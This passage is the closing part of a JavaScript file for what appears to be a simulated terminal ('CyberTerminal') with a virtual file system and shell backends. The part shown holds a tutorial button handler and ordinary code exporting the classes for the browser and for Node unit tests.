      if (finishBtn) {
        finishBtn.onclick = () => this.hideTutorial();
      }
    }
  }

  // --------------------------------------------------------------------------
  // Exports pour navigateur et Node.js (Tests unitaires)
  // --------------------------------------------------------------------------
  if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
      VFSNode,
      VirtualFileSystem,
      MachineBackend,
      VirtualShellBackend,
      DockerMachineBackend,
      CyberTerminal
    };
  }

  if (typeof window !== 'undefined') {
    window.VFSNode = VFSNode;
    window.VirtualFileSystem = VirtualFileSystem;
    window.MachineBackend = MachineBackend;
    window.VirtualShellBackend = VirtualShellBackend;
    window.DockerMachineBackend = DockerMachineBackend;
    window.CyberTerminal = CyberTerminal;
  }

})(typeof window !== 'undefined' ? window : globalThis);
